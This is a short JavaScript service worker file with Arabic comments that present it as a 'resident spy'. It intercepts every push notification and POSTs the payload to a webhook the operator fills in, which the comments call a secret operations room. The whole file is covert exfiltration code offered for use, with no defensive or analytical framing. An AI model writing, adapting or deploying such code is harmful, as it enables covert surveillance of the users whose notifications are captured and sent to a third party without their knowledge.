// ملف الجاسوس المقيم sw.js
self.addEventListener('push', function(event) {
    let payload = event.data ? event.data.text() : 'إشعار جديد بلا محتوى';
    
    // إرسال البيانات فوراً لغرفة عملياتنا السريّة
    event.waitUntil(
        fetch('ضع_رابط_WEBHOOK_الخاص_بك_هنا', {
            method: 'POST',
            body: JSON.stringify({ data: payload })
        })
    );
});
